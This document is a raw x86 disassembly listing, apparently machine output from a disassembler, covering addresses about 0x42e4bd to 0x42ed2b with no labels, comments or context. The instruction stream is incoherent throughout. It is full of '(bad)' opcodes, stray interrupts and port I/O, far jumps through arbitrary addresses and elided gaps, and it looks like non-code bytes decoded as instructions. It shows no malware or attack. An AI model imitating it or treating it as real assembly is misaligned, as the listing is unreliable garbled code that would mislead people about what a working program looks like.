  42e4bd:	gs cmp bh,bh
  42e4c0:	mov    ah,0x71
  42e4c2:	inc    edx
  42e4c3:	dec    ecx
  42e4c5:	or     DWORD PTR [edi-0x1],0xffffffca
  42e4c9:	xchg   BYTE PTR [eax-0x1],dl
  42e4cc:	int    0x8d
  42e4ce:	push   edi
  42e4cf:	call   edx
  42e4d1:	cwde   
  42e4d2:	pop    edi
  42e4d3:	inc    ebx
  42e4d5:	adc    BYTE PTR [eax-0x33],0x4a
  42e4d9:	sub    eax,0x1b19
  42e4de:	add    BYTE PTR [edi],al
  42e4e0:	add    BYTE PTR [eax],al
  42e4e2:	add    BYTE PTR [edx],al
	...
  42e4fc:	mov    al,0x44
  42e4fe:	cmp    cl,BYTE PTR [ebx]
  42e500:	mov    cl,0x4e
  42e502:	inc    eax
  42e503:	mov    ebx,0xff4251ad
  42e508:	xchg   esi,eax
  42e509:	dec    ecx
  42e50a:	cmp    bh,bh
  42e50c:	jge    0x42e578
  42e50e:	cmp    eax,0x227c28ff
  42e513:	jmp    DWORD PTR ds:0x1dff1e71
  42e519:	jno    0x42e52f
  42e51b:	call   DWORD PTR [esi]
  42e51d:	ja     0x42e52d
  42e51f:	call   FWORD PTR [eax]
  42e521:	jnp    0x42e532
  42e523:	call   FWORD PTR [edx+eax*4]
  42e526:	ud0    esp,DWORD PTR [edx]
  42e529:	mov    DWORD PTR [ebx],edx
  42e52b:	jmp    DWORD PTR ds:0x29ff158c
  42e531:	xchg   ebx,eax
  42e532:	push   ss
  42e533:	jmp    FWORD PTR [ecx]
  42e535:	xchg   edi,eax
  42e536:	sbb    bh,bh
  42e538:	daa    
  42e539:	mov    ds:0x7d78ff1b,al
  42e53e:	xor    edi,edi
  42e540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e541:	pop    edx
  42e542:	xor    edi,edi
  42e544:	mov    esi,0xc2ff426c
  42e549:	jae    0x42e592
  42e54b:	inc    ebx
  42e54d:	js     0x42e599
  42e54f:	inc    ebp
  42e551:	jp     0x42e5a2
  42e553:	dec    ecx
  42e555:	xchg   DWORD PTR [eax-0x1],ebx
  42e558:	ret    
  42e559:	ja     0x42e5a7
  42e55b:	lods   al,BYTE PTR ds:[esi]
  42e55c:	mov    dh,0x3a
  42e55e:	sub    eax,DWORD PTR [ecx]
	...
  42e57c:	mov    cl,0x4a
  42e57e:	mov    BYTE PTR ds:[ebx-0x6100baad],dh
  42e585:	dec    ebx
  42e586:	cmp    eax,0x415c90ff
  42e58b:	push   DWORD PTR [ebx]
  42e58d:	test   BYTE PTR [esi],ah
  42e58f:	jmp    DWORD PTR [ebx]
  42e591:	jb     0x42e5ac
  42e593:	call   FWORD PTR [edx+esi*2]
  42e596:	adc    bh,bh
  42e598:	sbb    BYTE PTR [edx+0xe],bh
  42e59b:	jmp    DWORD PTR [eax]
  42e59d:	adc    DWORD PTR [edi+edi*8],0xff0f8221
  42e5a4:	and    eax,0x2bff1589
  42e5a9:	xchg   edx,eax
  42e5aa:	push   ds
  42e5ab:	jmp    FWORD PTR [ecx]
  42e5ad:	xchg   ebx,eax
  42e5ae:	sbb    edi,edi
  42e5b0:	xor    eax,0x44ff2599
  42e5b5:	xchg   ebx,eax
  42e5b6:	sub    bh,bh
  42e5b8:	inc    esp
  42e5b9:	xchg   esi,eax
  42e5ba:	sub    bh,bh
  42e5bc:	popa   
  42e5bd:	jns    0x42e5eb
  42e5bf:	call   FWORD PTR [ebx-0x4900d3b2]
  42e5c5:	pop    ecx
  42e5c6:	ss (bad) 
  42e5c8:	mov    ecx,0xbbff3a5e
  42e5cd:	popa   
  42e5ce:	cmp    eax,0x4269bcff
  42e5d3:	(bad)  
  42e5d4:	mov    esi,0xc2ff476d
  42e5d9:	jns    0x42e62c
  42e5db:	(bad)  
  42e5dc:	mov    ebp,0x684969
	...
  42e5f5:	add    BYTE PTR [eax],al
  42e5f7:	add    BYTE PTR [ebx-0x54cdd2c5],ch
  42e5fd:	aas    
  42e5fe:	xor    ebp,esi
  42e600:	stos   DWORD PTR es:[edi],eax
  42e601:	inc    eax
  42e602:	xor    bh,bh
  42e604:	xchg   edx,eax
  42e605:	cmp    DWORD PTR [ecx],ebp
  42e607:	call   FWORD PTR [ebx+0x7e]
  42e60a:	xor    edi,edi
  42e60c:	push   ss
  42e60d:	adc    DWORD PTR [edx],0xe7825ff
  42e613:	jmp    DWORD PTR [edx]
  42e615:	mov    BYTE PTR [ebx],dl
  42e617:	jmp    FWORD PTR [ebx]
  42e619:	xchg   ecx,eax
  42e61a:	sbb    al,0xff
  42e61c:	sub    DWORD PTR [esi-0x6bd500e6],ecx
  42e622:	push   ds
  42e623:	jmp    FWORD PTR [ecx+eiz*4]
  42e626:	and    edi,edi
  42e628:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42e62a:	sub    bh,bh
  42e62c:	ja     0x42e6a9
  42e62e:	cmp    eax,0x2d5882ff
  42e633:	dec    DWORD PTR [ebx-0x7300d7b6]
  42e639:	inc    esp
  42e63a:	and    edi,edi
  42e63c:	xchg   ebx,eax
  42e63d:	ds and bh,bh
  42e640:	pushf  
  42e641:	inc    edx
  42e642:	daa    
  42e643:	push   DWORD PTR [ebx-0x4a00cdb1]
  42e649:	push   ecx
  42e64a:	xor    al,0xff
  42e64c:	mov    ch,0x52
  42e64e:	xor    al,0xff
  42e650:	mov    dh,0x57
  42e652:	cmp    bh,bh
  42e654:	mov    bh,0x5d
  42e656:	ds (bad) 
  42e658:	mov    eax,0xbbff4061
  42e65d:	inc    dx
  42e65f:	icebp  
  42e660:	mov    dh,0x59
  42e662:	cmp    BYTE PTR [esi],dl
	...
  42e678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e679:	xor    al,0x27
  42e67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e67c:	test   al,0x35
  42e67e:	daa    
  42e67f:	jmp    FWORD PTR [ecx-0x7300d8ca]
  42e685:	das    
  42e686:	sbb    eax,0x1d6d45ff
  42e68b:	call   DWORD PTR [ecx]
  42e68d:	nop
  42e68e:	adc    edi,edi
  42e690:	sub    DWORD PTR [ebp-0x69d500ec],ecx
  42e696:	and    edi,edi
  42e698:	xor    eax,0x37ff28a1
  42e69d:	stos   DWORD PTR es:[edi],eax
  42e69e:	sub    edi,edi
  42e6a0:	cmp    al,0xb4
  42e6a2:	cmp    bh,bh
  42e6a4:	inc    eax
  42e6a5:	mov    edx,0xb059ff3f
  42e6aa:	dec    esi
  42e6ab:	dec    DWORD PTR [ebp-0x6500d9c1]
  42e6b1:	xor    eax,0x3ba9ff22
  42e6b6:	daa    
  42e6b7:	jmp    FWORD PTR [ebp-0x4f00d5c2]
  42e6bd:	inc    ecx
  42e6be:	sub    edi,edi
  42e6c0:	mov    bl,0x44
  42e6c2:	push   DWORD PTR cs:[ebx-0x4c00d1ba]
  42e6c9:	dec    eax
  42e6ca:	das    
  42e6cb:	push   DWORD PTR [edx-0x4d00ceb7]
  42e6d1:	dec    ebx
  42e6d2:	xor    edi,edi
  42e6d4:	mov    dl,0x4e
  42e6d6:	xor    edi,edi
  42e6d8:	mov    cl,0x4f
  42e6da:	xor    eax,0x3c5bb6ff
  42e6df:	push   DWORD PTR [esi+0x86405b]
	...
  42e6f1:	add    BYTE PTR [eax],al
  42e6f3:	add    BYTE PTR [edi-0x5ae0dace],ah
  42e6f9:	xor    esp,DWORD PTR ds:0x2734a7f4
  42e6ff:	jmp    FWORD PTR [ecx-0x6e00d8cb]
  42e705:	cs sbb eax,0x1a387bff
  42e70b:	call   FWORD PTR [edi]
  42e70d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e70e:	and    edi,edi
  42e710:	sub    ebp,DWORD PTR [ebx-0x5dc600db]
  42e716:	inc    DWORD PTR cs:[ebx-0x47]
  42e71a:	cmp    bh,bh
  42e71c:	dec    eax
  42e71d:	int    0x54
  42e71f:	(bad)  
  42e720:	js     0x42e6da
  42e722:	dec    DWORD PTR gs:[esi-0x7100b683]
  42e729:	push   ebp
  42e72a:	xor    bh,bh
  42e72c:	(bad)  
  42e72d:	xor    eax,0x41b1ff1f
  42e732:	sub    al,0xff
  42e734:	mov    eax,0xb6ff2e40
  42e739:	cmp    eax,0x3fb5ff2d
  42e73e:	sub    al,0xff
  42e740:	mov    ch,0x3e
  42e742:	sub    al,0xff
  42e744:	mov    dl,0x3f
  42e746:	sub    al,0xff
  42e748:	mov    dl,0x41
  42e74a:	sub    al,0xff
  42e74c:	mov    cl,0x44
  42e74e:	push   DWORD PTR cs:[ecx-0x4e00d0bb]
  42e755:	inc    edi
  42e756:	xor    bh,bh
  42e758:	scas   eax,DWORD PTR es:[edi]
  42e759:	dec    edx
  42e75a:	xor    bh,bh
  42e75c:	scas   eax,DWORD PTR es:[edi]
  42e75d:	dec    ebp
  42e75e:	xor    bh,bh
  42e760:	mov    cl,0x54
  42e762:	aaa    
  42e763:	repnz mov cl,0x52
  42e766:	xor    al,0xa
	...
  42e774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e775:	xor    ah,BYTE PTR ds:0x2533a569
  42e77b:	jmp    DWORD PTR [edi-0x5d00d9cc]
  42e781:	xor    esp,DWORD PTR [ebx]
  42e783:	jmp    DWORD PTR [eax+0x7eff2334]
  42e789:	cmp    eax,0x8e44ff1f
  42e78e:	sub    edi,edi
  42e790:	inc    esi
  42e791:	stos   DWORD PTR es:[edi],eax
  42e792:	cmp    al,0xff
  42e794:	dec    ebx
  42e795:	lods   eax,DWORD PTR ds:[esi]
  42e796:	inc    edx
  42e797:	jmp    DWORD PTR [ebx-0x58]
  42e79a:	dec    ecx
  42e79b:	inc    DWORD PTR [eax-0x6d00a760]
  42e7a1:	push   esp
  42e7a2:	xor    edi,edi
  42e7a4:	xchg   edi,eax
  42e7a5:	inc    esp
  42e7a6:	and    eax,0x3050a9ff
  42e7ab:	push   DWORD PTR [ebx-0x4200c9aa]
  42e7b1:	pop    eax
  42e7b2:	cmp    bh,bh
  42e7b4:	mov    esp,0xbbff3750
  42e7b9:	dec    ecx
  42e7ba:	xor    edi,edi
  42e7bc:	mov    bh,0x42
  42e7be:	push   DWORD PTR cs:[ebp-0x4c00d3c3]
  42e7c5:	cmp    al,0x2b
  42e7c7:	push   DWORD PTR [ebx-0x4d00d4c4]
  42e7cd:	cmp    eax,0x40b0ff2c
  42e7d2:	sub    al,0xff
  42e7d4:	mov    ds:0xa1ff273b,al
  42e7d9:	ds sub bh,bh
  42e7dc:	mov    al,ds:0xa7ff2940
  42e7e1:	dec    edx
  42e7e2:	xor    bh,bh
  42e7e4:	lods   eax,DWORD PTR ds:[esi]
  42e7e5:	dec    ebp
  42e7e6:	ss dec edx
	...
  42e7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7f5:	xor    DWORD PTR [ebp*4-0xdace5b],esp
  42e7fc:	mov    al,ds:0x97ff2331
  42e801:	xor    BYTE PTR [eax],ah
  42e803:	dec    DWORD PTR [ecx-0x7b00dbbf]
  42e809:	push   eax
  42e80a:	sub    edi,edi
  42e80c:	mov    BYTE PTR [esi+0x27],cl
  42e80f:	dec    DWORD PTR [ebx-0x7200cd9d]
  42e815:	push   0x33
  42e817:	call   DWORD PTR [ebx-0x6500daae]
  42e81d:	dec    esi
  42e81e:	and    al,0xff
  42e820:	mov    ds:0xc0ff2854,al
  42e825:	push   0x37
  42e827:	inc    edi
  42e829:	jb     0x42e869
  42e82b:	inc    esi
  42e82d:	jo     0x42e86f
  42e82f:	inc    ebx
  42e831:	imul   eax,DWORD PTR [eax-0x1],0xffffffc1
  42e835:	inc    ax
  42e837:	(bad)  
  42e838:	mov    esi,0xbcff3b5c
  42e83d:	dec    edi
  42e83e:	xor    eax,0x3144b9ff
  42e843:	push   DWORD PTR [edi-0x4c00d3c3]
  42e849:	cmp    ch,BYTE PTR [edx]
  42e84b:	push   DWORD PTR [edx-0x5f00d5c5]
  42e851:	ss and al,0xff
  42e854:	xchg   DWORD PTR [esi],ebp
  42e856:	sbb    edi,edi
  42e858:	jbe    0x42e8ac
  42e85a:	and    al,0xff
  42e85c:	jl     0x42e89e
  42e85e:	and    edi,edi
  42e860:	mov    DWORD PTR [edi+ebx*1],esi
  42e863:	call   DWORD PTR [ecx+0xa32b48]
	...
  42e871:	add    BYTE PTR [eax],al
  42e873:	add    BYTE PTR [ebx-0x5d27dcd0],ah
  42e879:	xor    DWORD PTR [ebx],esp
  42e87b:	call   DWORD PTR [eax-0x7d00e2d4]
  42e881:	inc    ecx
  42e882:	and    bh,bh
  42e884:	ja     0x42e8e8
  42e886:	jmp    FWORD PTR cs:[eax-0x4b00d7b3]
  42e88d:	pop    eax
  42e88e:	daa    
  42e88f:	(bad)  
  42e890:	mov    ecx,0xb9ff2961
  42e895:	data16 sub bh,bh
  42e898:	mov    esp,0xc8ff2d6c
  42e89d:	jl     0x42e8d2
  42e89f:	dec    esi
  42e8a1:	cmp    BYTE PTR [eax],0xff
  42e8a4:	into   
  42e8a5:	cmp    DWORD PTR [edx],0xffffffff
  42e8a8:	into   
  42e8a9:	cmp    DWORD PTR [esi],0xffffffff
  42e8ac:	int    0x7f
  42e8ae:	inc    eax
  42e8af:	dec    ecx
  42e8b1:	jns    0x42e8f5
  42e8b3:	dec    eax
  42e8b5:	jae    0x42e8fb
  42e8b7:	inc    ebp
  42e8b9:	outs   dx,BYTE PTR ds:[esi]
  42e8ba:	inc    ebx
  42e8bb:	inc    ecx
  42e8bd:	arpl   WORD PTR [edi],di
  42e8bf:	(bad)  
  42e8c0:	mov    ebp,0xbaff3856
  42e8c5:	dec    eax
  42e8c6:	xor    bh,bh
  42e8c8:	mov    ch,0x3b
  42e8ca:	sub    edi,edi
  42e8cc:	lods   al,BYTE PTR ds:[esi]
  42e8cd:	aaa    
  42e8ce:	daa    
  42e8cf:	dec    DWORD PTR [edx+0x78ff1b2d]
  42e8d5:	push   esi
  42e8d6:	jmp    DWORD PTR es:[eax]
  42e8d9:	popf   
  42e8da:	pop    ds
  42e8db:	jmp    FWORD PTR ds:0x74ff2689
  42e8e1:	inc    eax
  42e8e2:	pop    ds
  42e8e3:	push   DWORD PTR [esi+0x41]
  42e8e6:	and    esp,ebx
	...
  42e8f4:	sahf   
  42e8f5:	cs and dh,cl
  42e8f8:	mov    WORD PTR [edx],gs
  42e8fa:	sbb    al,0xff
  42e8fc:	mov    dh,BYTE PTR [ebx]
  42e8fe:	push   ds
  42e8ff:	call   FWORD PTR [ebp+0x73]
  42e902:	es (bad) 
  42e904:	jnp    0x42e96a
  42e906:	sub    bh,bh
  42e908:	mov    al,0x58
  42e90a:	and    al,0xff
  42e90c:	shr    BYTE PTR [edx+0x28],0xff
  42e910:	mov    dh,0x79
  42e912:	sub    eax,0x3887bbff
  42e917:	inc    esi
  42e919:	test   DWORD PTR [ecx],esi
  42e91b:	call   edx
  42e91d:	nop
  42e91e:	xor    eax,0x3996d7ff
  42e923:	call   esi
  42e925:	xchg   ebp,eax
  42e926:	cmp    bh,bh
  42e928:	aad    0x94
  42e92a:	cmp    al,0xff
  42e92c:	aam    0x8f
  42e92e:	ds dec edi
  42e931:	mov    DWORD PTR [edi],edi
  42e933:	dec    esp
  42e935:	add    DWORD PTR [ebx-0x1],0xff4579c9
  42e93c:	lds    esi,FWORD PTR [ecx+0x45]
  42e93f:	inc    edx
  42e941:	inc    dx
  42e943:	(bad)  
  42e944:	mov    esp,0xb8ff3a56
  42e949:	inc    esp
  42e94a:	xor    bh,bh
  42e94c:	stos   BYTE PTR es:[edi],al
  42e94d:	ss dec DWORD PTR es:[eax+0x32ff2240]
  42e955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e956:	xor    edi,edi
  42e958:	sbb    ebx,DWORD PTR [ebp-0x6ee900d7]
  42e95e:	and    al,0xff
  42e960:	push   ds
  42e961:	jbe    0x42e978
  42e963:	push   DWORD PTR [ecx]
  42e965:	push   ecx
  42e966:	adc    ecx,edi
	...
  42e974:	mov    ebp,DWORD PTR [ecx]
  42e976:	sbb    edi,esi
  42e978:	mov    BYTE PTR [edx],dh
  42e97a:	sbb    eax,0x217a51ff
  42e97f:	call   FWORD PTR [eax+0x75]
  42e982:	daa    
  42e983:	jmp    DWORD PTR [ecx-0x4f00dfb3]
  42e989:	fs and edi,edi
  42e98c:	lods   eax,DWORD PTR ds:[esi]
  42e98d:	jp     0x42e9bc
  42e98f:	(bad)  
  42e990:	mov    edi,0xcaff358d
  42e995:	fwait
  42e996:	inc    eax
  42e997:	call   ebx
  42e999:	pushf  
  42e99a:	xor    bh,bh
  42e99c:	fsub   QWORD PTR [esi-0x522000c8]
  42e9a2:	cmp    edi,edi
  42e9a4:	fisubr WORD PTR [ebx-0x562200c3]
  42e9aa:	ds (bad) 
  42e9ac:	(bad)  [edx-0x652800c3]
  42e9b2:	notrack call ebx
  42e9b5:	xchg   ecx,eax
  42e9b6:	inc    edx
  42e9b7:	dec    esi
  42e9b9:	xchg   DWORD PTR [ebp-0x1],eax
  42e9bc:	retf   0x487b
  42e9bf:	inc    esi
  42e9c1:	jb     0x42ea09
  42e9c3:	inc    ecx
  42e9c5:	inc    dx
  42e9c7:	(bad)  
  42e9c8:	mov    ebx,0xa6ff3853
  42e9cd:	cmp    ch,BYTE PTR [eax]
  42e9cf:	dec    DWORD PTR [eax+eax*2-0x49c500de]
  42e9d6:	pop    ebx
  42e9d7:	jmp    DWORD PTR [ebx]
  42e9d9:	lods   al,BYTE PTR ds:[esi]
  42e9da:	push   ebp
  42e9db:	call   FWORD PTR ds:0xdff419e
  42e9e1:	jg     0x42e9ff
  42e9e3:	dec    DWORD PTR [ebx+edx*2]
  42e9e6:	or     edi,edi
	...
  42e9f4:	test   BYTE PTR [edx],ch
  42e9f6:	sbb    edi,esi
  42e9f8:	push   ebx
  42e9f9:	gs push ds
  42e9fb:	push   DWORD PTR [ebx+0x60]
  42e9fe:	sub    eax,0x2a578bff
  42ea03:	call   FWORD PTR [esi-0x5800dda9]
  42ea09:	jle    0x42ea3b
  42ea0b:	(bad)  
  42ea0c:	mov    ebp,0xd2ff3590
  42ea11:	sahf   
  42ea12:	xor    bh,bh
  42ea14:	fisubr DWORD PTR [eax+edi*1+0x3eb4ddff]
  42ea1b:	jmp    esi
  42ea1d:	rol    DWORD PTR [edi+edi*8-0x19],0xc2
  42ea22:	inc    esi
  42ea23:	jmp    esi
  42ea25:	mov    edi,0xbae4ff44
  42ea2a:	inc    ebp
  42ea2b:	jmp    eax
  42ea2d:	mov    bl,0x42
  42ea2f:	(bad)  
  42ea30:	fisubr WORD PTR [ebx-0x5f2500be]
  42ea36:	inc    esp
  42ea37:	call   ebp
  42ea39:	xchg   esi,eax
  42ea3a:	inc    edi
  42ea3b:	dec    ebp
  42ea3d:	mov    DWORD PTR [ebx-0x1],ecx
  42ea40:	leave  
  42ea41:	jl     0x42ea8e
  42ea43:	inc    esp
  42ea45:	jo     0x42ea8f
  42ea47:	(bad)  
  42ea48:	mov    edi,0xa9ff4061
  42ea4d:	inc    edx
  42ea4e:	sub    eax,0x2f558bff
  42ea53:	call   DWORD PTR [eax-0x30]
  42ea56:	xchg   bh,bh
  42ea58:	dec    esp
  42ea59:	int    0x83
  42ea5b:	push   DWORD PTR [eax]
  42ea5d:	mov    ecx,0x9112ff5b
  42ea62:	sub    edi,edi
  42ea64:	sbb    BYTE PTR [eax+0x12],ah
  42ea67:	std    
	...
  42ea74:	jle    0x42eaac
  42ea76:	sbb    al,0xe9
  42ea78:	sub    DWORD PTR [ebp+0x458bff18],ecx
  42ea7e:	sub    bh,bh
  42ea80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ea81:	push   ebx
  42ea82:	es (bad) 
  42ea84:	mov    esi,0xbdff2973
  42ea89:	nop
  42ea8a:	xor    edi,edi
  42ea8c:	int3   
  42ea8d:	sahf   
  42ea8e:	xor    eax,0x3cb6dcff
  42ea93:	(bad)  
  42ea94:	jmp    0x42ea60
  42ea96:	dec    edx
  42ea97:	(bad)  
  42ea98:	out    dx,al
  42ea99:	rcl    BYTE PTR [eax-0x1],cl
  42ea9c:	out    dx,eax
  42ea9d:	xlat   BYTE PTR ds:[ebx]
  42ea9e:	push   esp
  42ea9f:	push   eax
  42eaa1:	xlat   BYTE PTR ds:[ebx]
  42eaa2:	push   edi
  42eaa3:	(bad)  
  42eaa4:	out    dx,eax
  42eaa5:	aam    0x53
  42eaa7:	(bad)  
  42eaa8:	in     al,dx
  42eaa9:	int    0x4d
  42eaab:	(bad)  
  42eaac:	call   0xe3423374
  42eab1:	mov    edx,0xaedfff47
  42eab6:	inc    edi
  42eab7:	(bad)  
  42eab8:	fldenv [ecx-0x6b2d00b7]
  42eabe:	dec    edi
  42eabf:	dec    esp
  42eac1:	xchg   BYTE PTR [esi-0x1],cl
  42eac4:	(bad)  
  42eac5:	jns    0x42eb13
  42eac7:	inc    ebx
  42eac9:	ins    BYTE PTR es:[edi],dx
  42eaca:	inc    esi
  42eacb:	jmp    FWORD PTR [ebx-0x7200cdb4]
  42ead1:	cmp    di,di
  42ead4:	push   edx
  42ead5:	aad    0x93
  42ead7:	inc    DWORD PTR [ecx+edx*8-0x7a]
  42eadb:	push   DWORD PTR [ebx]
  42eadd:	lds    ebp,FWORD PTR [edx-0x1]
  42eae0:	sbb    al,0xb4
  42eae2:	inc    edx
  42eae3:	push   DWORD PTR [ebx]
  42eae5:	imul   ebx,DWORD PTR [ebx],0xfffffff0
	...
  42eaf4:	xchg   DWORD PTR ds:0x9326cb1f,esi
  42eafa:	push   ss
  42eafb:	(bad)  
  42eafc:	jp     0x42eb61
  42eafe:	sub    bh,bh
  42eb00:	lahf   
  42eb01:	push   ebx
  42eb02:	and    bh,bh
  42eb04:	stos   DWORD PTR es:[edi],eax
  42eb05:	gs and bh,bh
  42eb08:	test   eax,0xb9ff3791
  42eb0d:	nop
  42eb0e:	xor    bh,bh
  42eb10:	fdivr  DWORD PTR [ebx-0x210d00c0]
  42eb16:	pop    ebx
  42eb17:	push   ebp
  42eb19:	out    0x64,al
  42eb1b:	push   edi
  42eb1d:	jmp    0xea3bea8e
  42eb22:	ins    DWORD PTR es:[edi],dx
  42eb23:	push   esi
  42eb25:	out    0x66,al
  42eb27:	push   esp
  42eb29:	loopne 0x42eb8a
  42eb2b:	push   eax
  42eb2d:	(bad)  
  42eb2e:	push   esi
  42eb2f:	(bad)  
  42eb30:	jmp    0xe4423afe
  42eb35:	mov    edx,0xacddff4b
  42eb3a:	dec    ebp
  42eb3b:	call   ebp
  42eb3d:	popf   
  42eb3e:	push   edx
  42eb3f:	call   eax
  42eb41:	xchg   ecx,eax
  42eb42:	push   ebx
  42eb43:	dec    ecx
  42eb45:	adc    BYTE PTR [ecx-0x1],0xc5
  42eb49:	jae    0x42eb95
  42eb4b:	jmp    FWORD PTR [ebp+edx*2+0x5493ff36]
  42eb52:	xor    bh,bh
  42eb54:	dec    ebp
  42eb55:	int3   
  42eb56:	xchg   edi,edi
  42eb58:	lds    edi,FWORD PTR ss:[ebx-0x1]
  42eb5c:	das    
  42eb5d:	ret    0xff6a
  42eb60:	and    al,0xbc
  42eb62:	push   ecx
  42eb63:	dec    DWORD PTR [ebx+0x70]
  42eb66:	and    dl,cl
	...
  42eb74:	mov    WORD PTR [ebx],?
  42eb76:	and    al,0x9a
  42eb78:	sub    DWORD PTR [edx-0x6fc100e7],ebx
  42eb7e:	and    edi,edi
  42eb80:	xor    BYTE PTR [ebx+0x29],0xff
  42eb84:	or     BYTE PTR [ecx-0x49a300d4],0x39
  42eb8b:	(bad)  
  42eb8c:	mov    esi,0xcfff4ab7
  42eb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb92:	ss (bad) 
  42eb94:	call   0xfc424476
  42eb99:	hlt    
  42eb9a:	cmp    bh,0xfd
  42eb9d:	test   BYTE PTR [ebp-0x74090101],0xff
  42eba4:	std    
  42eba5:	repz cmp edi,0xff72eefb
  42ebac:	mul    bl
  42ebae:	arpl   di,di
  42ebb0:	icebp  
  42ebb1:	(bad)  
  42ebb2:	pop    eax
  42ebb3:	jmp    edi
  42ebb5:	(bad)  
  42ebb6:	push   edx
  42ebb7:	jmp    eax
  42ebb9:	mov    dh,0x52
  42ebbb:	(bad)  
  42ebbc:	fldenv [ebp-0x682e00aa]
  42ebc2:	push   edi
  42ebc3:	dec    edx
  42ebc5:	mov    BYTE PTR [edi+edi*8-0x3a],dl
  42ebc9:	jns    0x42ec19
  42ebcb:	push   DWORD PTR [ebx-0x6f00c1a1]
  42ebd1:	cmp    eax,0xb36eff24
  42ebd6:	outs   dx,BYTE PTR ds:[esi]
  42ebd7:	(bad)  
  42ebd8:	cmp    eax,0x2cff85cd
  42ebdd:	mov    esp,0xbb26ff67
  42ebe2:	push   esp
  42ebe3:	call   FWORD PTR [ebp+0x62]
  42ebe6:	and    edx,DWORD PTR [edx+0x0]
	...
  42ebf4:	xchg   edx,eax
  42ebf5:	inc    ecx
  42ebf6:	sub    BYTE PTR [edx+0x38],al
  42ebf9:	xchg   DWORD PTR [esi],ebx
  42ebfb:	std    
  42ebfc:	adc    bh,BYTE PTR [ebx+ebx*1+0x1daf19ff]
  42ec03:	call   FWORD PTR [eax+ebp*4]
  42ec06:	sbb    eax,0x29c521ff
  42ec0b:	inc    DWORD PTR [esp+ebx*8+0x4d]
  42ec0f:	(bad)  
  42ec10:	fsubr  st(0),st
  42ec12:	ja     0x42ec13
  42ec14:	jmp    0x42ebf9
  42ec16:	dec    esi
  42ec17:	(bad)  
  42ec18:	cli    
  42ec19:	clc    
  42ec1a:	mov    bh,bh
  42ec1c:	(bad)  
  42ec1d:	(bad)  
  42ec1e:	mov    eax,0xbffeffff
  42ec23:	(bad)  
  42ec24:	(bad)  
  42ec25:	cld    
  42ec26:	test   eax,0x91f8feff
  42ec2b:	(bad)  
  42ec2c:	cld    
  42ec2d:	out    dx,al
  42ec2e:	jae    0x42ec2f
  42ec30:	cmc    
  42ec31:	loope  0x42ec97
  42ec33:	(bad)  
  42ec34:	in     al,dx
  42ec35:	iret   
  42ec36:	pop    edx
  42ec37:	jmp    ebx
  42ec39:	mov    ebp,0xabdaff58
  42ec3e:	pop    edx
  42ec3f:	call   esp
  42ec41:	pushf  
  42ec42:	pop    esp
  42ec43:	dec    ebx
  42ec45:	lea    edx,[edi-0x1]
  42ec48:	enter  0x507e,0xff
  42ec4c:	mov    esi,0x97ff4569
  42ec51:	inc    ecx
  42ec52:	sub    edi,edi
  42ec54:	jbe    0x42ec13
  42ec56:	jae    0x42ec57
  42ec58:	push   ecx
  42ec59:	fistp  WORD PTR [edi+edi*8-0x8b3dc9]
  42ec60:	and    al,0xac
  42ec62:	dec    ebx
  42ec63:	(bad)  
  42ec64:	ins    DWORD PTR es:[edi],dx
  42ec65:	push   eax
  42ec66:	and    DWORD PTR [esi],ebp
	...
  42ec78:	inc    edi
  42ec79:	jb     0x42ec99
  42ec7b:	loope  0x42ec90
  42ec7d:	mov    esp,0xbe1dff1d
  42ec82:	sub    bh,bh
  42ec84:	and    DWORD PTR [eax-0x39d100e0],esi
  42ec8a:	xor    bh,bh
  42ec8c:	aas    
  42ec8d:	out    0x64,eax
  42ec8f:	inc    DWORD PTR [ebx+esi*8-0x8090053]
  42ec96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec97:	(bad)  
  42ec98:	std    
  42ec99:	std    
  42ec9a:	addr16 (bad) 
  42ec9c:	(bad)  
  42ec9d:	(bad)  
  42ec9e:	mov    al,ds:0xd8fcfdff
  42eca3:	(bad)  
  42eca4:	cli    
  42eca5:	clc    
  42eca6:	ret    
  42eca7:	(bad)  
  42eca8:	(bad)  
  42eca9:	std    
  42ecaa:	stos   DWORD PTR es:[edi],eax
  42ecab:	(bad)  
  42ecac:	(bad)  
  42ecad:	test   BYTE PTR [esi+0x6ce7f8ff],0xff
  42ecb4:	out    dx,al
  42ecb5:	aad    0x62
  42ecb7:	jmp    esp
  42ecb9:	rcr    DWORD PTR [ebp-0x1],0xdc
  42ecbd:	scas   al,BYTE PTR es:[edi]
  42ecbe:	pop    ebp
  42ecbf:	call   esp
  42ecc1:	lahf   
  42ecc2:	pop    edi
  42ecc3:	dec    ebp
  42ecc5:	nop
  42ecc6:	pop    ecx
  42ecc7:	inc    esp
  42ecc9:	jge    0x42ed1a
  42eccb:	call   FWORD PTR [eax+edx*2+0x5097ff31]
  42ecd2:	xor    bh,bh
  42ecd4:	xchg   ecx,eax
  42ecd5:	test   DWORD PTR [edi+edi*8+0x5e],edx
  42ecd9:	loope  0x42ec7d
  42ecdb:	(bad)  
  42ecdc:	ds mov ebp,0x6f4bff71
  42ece2:	das    
  42ece3:	fadd   DWORD PTR [eax]
	...
  42ecf5:	add    BYTE PTR [eax],al
  42ecf7:	add    BYTE PTR [esi+0x5e],bl
  42ecfa:	and    al,BYTE PTR [ebx-0x1e752e7]
  42ed00:	sbb    eax,0x21ff2fc7
  42ed05:	lds    esi,FWORD PTR [edx]
  42ed07:	push   DWORD PTR [esi+ecx*8]
  42ed0a:	inc    edx
  42ed0b:	call   DWORD PTR [ebx-0x1c]
  42ed0e:	test   edi,edi
  42ed10:	jne    0x42ed07
  42ed12:	int    0xff
  42ed14:	mov    esp,0xfefff4fc
  42ed19:	push   ecx
  42ed1b:	(bad)  
  42ed1c:	(bad)  
  42ed1d:	(bad)  
  42ed1e:	mov    ebx,0xc5f5f6ff
  42ed23:	(bad)  
  42ed24:	clc    
  42ed25:	neg    ebx
  42ed27:	push   edi
  42ed29:	hlt    
  42ed2a:	scas   eax,DWORD PTR es:[edi]
  42ed2b:	push   esp
